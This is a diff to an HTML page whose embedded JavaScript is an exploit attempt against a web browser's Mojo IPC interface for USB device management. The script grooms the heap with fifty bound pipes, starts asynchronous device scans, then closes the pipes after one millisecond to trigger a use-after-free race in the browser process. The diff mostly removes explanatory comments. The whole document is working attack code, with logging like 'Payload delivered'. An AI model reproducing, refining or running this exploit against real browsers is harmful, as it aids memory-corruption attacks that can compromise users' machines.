@@ -7,56 +7,52 @@
 <body>
     <h1>Hunting the Browser Process</h1>
     <script type="module">
-        // 2. Import the ES6 module from your exact path
-        // In modern Mojo bindings, interfaces export a "Remote" class
         import { UsbDeviceManagerRemote, UsbDeviceManager } from './gen/services/device/public/mojom/usb_manager.mojom.m.js';
 
         async function triggerExploit() {
             if (typeof Mojo === 'undefined') {
-                console.error("[-] MojoJS not found. Did you launch with --enable-blink-features=MojoJS?");
+                console.error("[-] MojoJS not found.");
                 return;
             }
 
             console.log("[*] Grooming the Browser Heap...");
             let managers = [];
             
-            // 3. Instantiate multiple managers to ensure reliable heap placement
             for(let i = 0; i < 50; i++) {
                 let usbManagerRemote = new UsbDeviceManagerRemote();
                 
-                // Bind the interface. $interfaceName is auto-generated in the .m.js file.
-                Mojo.bindInterface(
-                    UsbDeviceManager.$interfaceName, 
-                    usbManagerRemote.$.bindNewPipeAndPassReceiver().handle
-                );
+                // 1. Create the receiver pipe
+                let receiver = usbManagerRemote.$.bindNewPipeAndPassReceiver();
+                
+                // 2. Pass the raw handle of the receiver to the Browser Process
+                Mojo.bindInterface(UsbDeviceManager.$interfaceName, receiver.handle);
+                
                 managers.push(usbManagerRemote);
             }
 
             console.log("[+] Bound 50 Mojo pipes to Browser Process.");
             console.log("[*] Triggering async hardware requests...");
             
-            // 4. Call GetDevices. This tells the C++ backend to scan the USB bus asynchronously.
             for(let m of managers) {
+                // Call GetDevices. We catch the error because we expect 
+                // the pipe to break before it finishes.
                 m.getDevices().catch(e => {}); 
             }
 
-            // 5. THE RACE CONDITION: Wait just 1 millisecond.
-            // We want the C++ backend to start the USB scan, but we want to kill 
-            // the object before the scan finishes.
+            // THE RACE CONDITION
             await new Promise(r => setTimeout(r, 1)); 
 
             console.log("[!] TRIGGERING FREE: Severing pipes...");
             
-            // 6. The Kill: Close the pipes. 
-            // This signals the Browser Process to destroy the UsbDeviceManagerImpl C++ objects.
+            // The Kill: Close the pipes.
             for(let m of managers) {
                 m.$.close();
             }
 
-            // 7. Force garbage collection in the renderer to ensure cleanup
+            // Force garbage collection
             if (window.gc) { window.gc(); }
 
-            console.log("[?] Payload delivered. If the C++ callback is flawed, the Browser Process will crash now.");
+            console.log("[?] Payload delivered. Waiting for C++ crash...");
         }
 
         triggerExploit();
